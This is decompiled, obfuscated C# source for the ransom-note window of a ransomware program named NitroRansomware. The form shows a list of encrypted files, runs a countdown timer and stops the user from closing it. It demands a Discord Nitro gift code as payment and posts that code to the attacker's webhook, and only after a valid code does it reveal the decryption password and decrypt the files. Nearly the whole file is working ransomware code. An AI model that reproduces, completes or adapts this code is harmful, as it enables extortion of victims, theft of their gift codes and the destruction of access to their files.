using System;
using System.ComponentModel;
using System.Drawing;
using System.Timers;
using System.Windows.Forms;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;
using zlqCXdcKao7YZQAGFe;

namespace NitroRansomware;

public class Form1 : Form
{
	private Timer t;

	private int h;

	private int m;

	private int s;

	private Webhook ww;

	private IContainer components;

	private BackgroundWorker backgroundWorker1;

	private Label label1;

	private TextBox textBox1;

	private Label label2;

	private Label label3;

	private Panel panel1;

	private Panel panel2;

	private Label label4;

	private Button button1;

	private Label label5;

	private TextBox textBox3;

	private Label label6;

	private Button button2;

	private TextBox textBox2;

	private TextBox textBox4;

	private Label label7;

	private Label label9;

	private TextBox textBox5;

	private Panel panel3;

	private Label label10;

	public Form1()
	{
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		h = 3;
		m = 0;
		s = 0;
		ww = new Webhook(Program.WEBHOOK);
		components = null;
		((Form)this)._002Ector();
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		t = new Timer();
		t.Interval = 1000.0;
		t.Elapsed += OnTimeEvent;
		t.Start();
		((Control)textBox5).set_Text("");
		foreach (string item in Crypto.encryptedFileLog)
		{
			TextBox obj = textBox5;
			((Control)obj).set_Text(((Control)obj).get_Text() + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(276) + item + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(302));
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		((CancelEventArgs)(object)e).Cancel = (int)e.get_CloseReason() == 3;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		if (NitroValid())
		{
			((Control)textBox3).set_Text(Crypto.fPassword);
			((Control)label7).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(310));
			((Control)label7).set_ForeColor(Color.LightGreen);
			((Control)textBox4).set_Text("");
			((Control)label1).set_Text("");
			((Control)panel3).set_BackColor(Color.FromArgb(35, 39, 42));
			((Control)textBox1).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(354));
			t.Stop();
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		string text = ((Control)textBox4).get_Text();
		if (text == Crypto.fPassword)
		{
			ww.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(788));
			MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(922), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), (MessageBoxButtons)0, (MessageBoxIcon)64);
			Crypto.inPassword = Crypto.fPassword;
			((Control)textBox5).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1032));
			Cursor.set_Current(Cursors.get_WaitCursor());
			Program.DecryptAll();
			Cursor.set_Current(Cursors.get_Default());
			MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1142), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else
		{
			MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1626), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void textBox5_TextChanged(object sender, EventArgs e)
	{
	}

	private bool NitroValid()
	{
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		Webhook webhook = new Webhook(Program.WEBHOOK);
		string text = ((Control)textBox2).get_Text();
		string empty = string.Empty;
		Console.WriteLine(text);
		if (text.Contains(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1652)))
		{
			if (text.Contains(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1682)))
			{
				int num = text.IndexOf(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1702));
				empty = text.Substring(num + 15);
				Console.WriteLine(empty);
			}
			else
			{
				int num2 = text.IndexOf(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1702));
				empty = text.Substring(num2 + 1);
				MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1708), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			if (Nitro.Check(empty))
			{
				webhook.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1764));
				webhook.Send(text);
				MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1834), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), (MessageBoxButtons)0, (MessageBoxIcon)64);
				return true;
			}
			webhook.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2066));
			MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2154), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			webhook.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2066));
			MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2184), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		return false;
	}

	private void OnTimeEvent(object sender, ElapsedEventArgs e)
	{
		((Control)this).Invoke((Delegate)(Action)delegate
		{
			if (s < 1)
			{
				s = 59;
				if (m == 0)
				{
					m = 59;
					if (h != 0)
					{
						h--;
					}
				}
				else
				{
					m--;
				}
			}
			else
			{
				s--;
			}
			if (s != 0 || m != 0 || h != 0)
			{
			}
			((Control)label10).set_Text(string.Format(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3276), h.ToString().PadLeft(2, '0'), m.ToString().PadLeft(2, '0'), s.ToString().PadLeft(2, '0')));
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Expected O, but got Unknown
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Expected O, but got Unknown
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Expected O, but got Unknown
		//IL_0079: Unknown result type (might be due to invalid IL or missing references)
		//IL_0083: Expected O, but got Unknown
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Expected O, but got Unknown
		//IL_008f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Expected O, but got Unknown
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a4: Expected O, but got Unknown
		//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00af: Expected O, but got Unknown
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Expected O, but got Unknown
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Expected O, but got Unknown
		//IL_00d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Expected O, but got Unknown
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Expected O, but got Unknown
		//IL_00e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected O, but got Unknown
		//IL_01e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f0: Expected O, but got Unknown
		//IL_02c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ce: Expected O, but got Unknown
		//IL_0363: Unknown result type (might be due to invalid IL or missing references)
		//IL_036d: Expected O, but got Unknown
		//IL_04fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0504: Expected O, but got Unknown
		//IL_0641: Unknown result type (might be due to invalid IL or missing references)
		//IL_064b: Expected O, but got Unknown
		//IL_077b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0785: Expected O, but got Unknown
		//IL_0a0a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a14: Expected O, but got Unknown
		//IL_0ab0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aba: Expected O, but got Unknown
		//IL_0b69: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b73: Expected O, but got Unknown
		//IL_0cb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc1: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(Type.GetTypeFromHandle(kSQlZa9TWrZWUAWTnp.GLmF52oPYUmB1(33554435)));
		backgroundWorker1 = new BackgroundWorker();
		label1 = new Label();
		textBox1 = new TextBox();
		label2 = new Label();
		label3 = new Label();
		panel1 = new Panel();
		panel2 = new Panel();
		label4 = new Label();
		button1 = new Button();
		label5 = new Label();
		textBox3 = new TextBox();
		label6 = new Label();
		button2 = new Button();
		textBox2 = new TextBox();
		textBox4 = new TextBox();
		label7 = new Label();
		label9 = new Label();
		textBox5 = new TextBox();
		panel3 = new Panel();
		label10 = new Label();
		((Control)panel2).SuspendLayout();
		((Control)panel3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2330), 24f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(25, 19));
		((Control)label1).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2374));
		((Control)label1).set_Size(new Size(579, 37));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2390));
		((Control)textBox1).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)0);
		((Control)textBox1).set_Font(new Font(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2472), 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(SystemColors.MenuBar);
		((Control)textBox1).set_Location(new Point(404, 134));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2492));
		((TextBoxBase)textBox1).set_ReadOnly(true);
		textBox1.set_ScrollBars((ScrollBars)2);
		((Control)textBox1).set_Size(new Size(370, 289));
		((Control)textBox1).set_TabIndex(3);
		((Control)textBox1).set_TabStop(false);
		((Control)textBox1).set_Text(componentResourceManager.GetString(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2512)));
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2472), 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.Control);
		((Control)label2).set_Location(new Point(553, 96));
		((Control)label2).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2542));
		((Control)label2).set_Size(new Size(45, 25));
		((Control)label2).set_TabIndex(5);
		((Control)label2).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2558));
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2472), 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(SystemColors.Control);
		((Control)label3).set_Location(new Point(127, 96));
		((Control)label3).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2570));
		((Control)label3).set_Size(new Size(147, 25));
		((Control)label3).set_TabIndex(6);
		((Control)label3).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2586));
		((Control)panel1).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)panel1).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel1).set_Location(new Point(-1, -4));
		((Control)panel1).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2618));
		((Control)panel1).set_Size(new Size(807, 32));
		((Control)panel1).set_TabIndex(4);
		((Control)panel2).set_BackColor(Color.FromArgb(35, 39, 42));
		((Control)panel2).get_Controls().Add((Control)(object)label1);
		((Control)panel2).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)panel2).set_Location(new Point(87, -1));
		((Control)panel2).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2634));
		((Control)panel2).set_Size(new Size(613, 67));
		((Control)panel2).set_TabIndex(7);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2472), 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(SystemColors.Control);
		((Control)label4).set_Location(new Point(84, 454));
		((Control)label4).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2650));
		((Control)label4).set_Size(new Size(151, 13));
		((Control)label4).set_TabIndex(9);
		((Control)label4).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2666));
		((Control)button1).set_BackColor(SystemColors.ButtonHighlight);
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Location(new Point(258, 480));
		((Control)button1).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2726));
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(10);
		((Control)button1).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2744));
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2472), 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(SystemColors.Control);
		((Control)label5).set_Location(new Point(84, 526));
		((Control)label5).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2762));
		((Control)label5).set_Size(new Size(122, 13));
		((Control)label5).set_TabIndex(11);
		((Control)label5).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2778));
		((Control)textBox3).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox3).set_BorderStyle((BorderStyle)1);
		((Control)textBox3).set_ForeColor(SystemColors.Window);
		((Control)textBox3).set_Location(new Point(71, 545));
		((Control)textBox3).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2828));
		((TextBoxBase)textBox3).set_ReadOnly(true);
		((Control)textBox3).set_Size(new Size(203, 20));
		((Control)textBox3).set_TabIndex(12);
		((Control)textBox3).set_TabStop(false);
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2472), 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(SystemColors.Control);
		((Control)label6).set_Location(new Point(550, 448));
		((Control)label6).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2848));
		((Control)label6).set_Size(new Size(84, 19));
		((Control)label6).set_TabIndex(13);
		((Control)label6).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2864));
		((Control)button2).set_BackColor(SystemColors.ButtonHighlight);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_Location(new Point(657, 516));
		((Control)button2).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2894));
		((Control)button2).set_Size(new Size(75, 23));
		((Control)button2).set_TabIndex(15);
		((Control)button2).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2864));
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)textBox2).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox2).set_BorderStyle((BorderStyle)1);
		((Control)textBox2).set_ForeColor(SystemColors.Window);
		((Control)textBox2).set_Location(new Point(49, 482));
		((Control)textBox2).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2912));
		((Control)textBox2).set_Size(new Size(203, 20));
		((Control)textBox2).set_TabIndex(8);
		((Control)textBox2).set_TabStop(false);
		((Control)textBox2).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2932));
		((Control)textBox4).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox4).set_BorderStyle((BorderStyle)1);
		((Control)textBox4).set_ForeColor(SystemColors.Window);
		((Control)textBox4).set_Location(new Point(448, 516));
		((Control)textBox4).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2976));
		((Control)textBox4).set_Size(new Size(203, 20));
		((Control)textBox4).set_TabIndex(17);
		((Control)textBox4).set_TabStop(false);
		((Control)textBox4).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2996));
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Font(new Font(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2472), 8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label7).set_ForeColor(SystemColors.Control);
		((Control)label7).set_Location(new Point(445, 485));
		((Control)label7).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3058));
		((Control)label7).set_Size(new Size(236, 13));
		((Control)label7).set_TabIndex(16);
		((Control)label7).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3074));
		((Control)label9).set_AutoSize(true);
		((Control)label9).set_Font(new Font(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2472), 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label9).set_ForeColor(SystemColors.Control);
		((Control)label9).set_Location(new Point(174, 329));
		((Control)label9).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3162));
		((Control)label9).set_Size(new Size(32, 19));
		((Control)label9).set_TabIndex(19);
		((Control)label9).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3178));
		((Control)textBox5).set_BackColor(Color.FromArgb(35, 39, 42));
		((TextBoxBase)textBox5).set_BorderStyle((BorderStyle)0);
		((Control)textBox5).set_Font(new Font(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2472), 7.2f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox5).set_ForeColor(SystemColors.MenuBar);
		((Control)textBox5).set_Location(new Point(35, 364));
		((TextBoxBase)textBox5).set_Multiline(true);
		((Control)textBox5).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3188));
		((TextBoxBase)textBox5).set_ReadOnly(true);
		textBox5.set_ScrollBars((ScrollBars)2);
		((Control)textBox5).set_Size(new Size(347, 59));
		((Control)textBox5).set_TabIndex(20);
		((Control)textBox5).set_TabStop(false);
		((Control)textBox5).add_TextChanged((EventHandler)textBox5_TextChanged);
		((Control)panel3).set_BackColor(Color.Crimson);
		((Control)panel3).get_Controls().Add((Control)(object)label10);
		((Control)panel3).set_Location(new Point(35, 134));
		((Control)panel3).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3208));
		((Control)panel3).set_Size(new Size(347, 178));
		((Control)panel3).set_TabIndex(21);
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Font(new Font(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2330), 50f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label10).set_Location(new Point(23, 47));
		((Control)label10).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3224));
		((Control)label10).set_Size(new Size(293, 76));
		((Control)label10).set_TabIndex(22);
		((Control)label10).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3242));
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(44, 47, 51));
		((Form)this).set_ClientSize(new Size(800, 600));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)panel3);
		((Control)this).get_Controls().Add((Control)(object)textBox5);
		((Control)this).get_Controls().Add((Control)(object)label9);
		((Control)this).get_Controls().Add((Control)(object)textBox4);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Control)this).set_ForeColor(SystemColors.ControlText);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3262));
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3262));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((Control)panel3).ResumeLayout(false);
		((Control)panel3).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	static Form1()
	{
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
	}
}
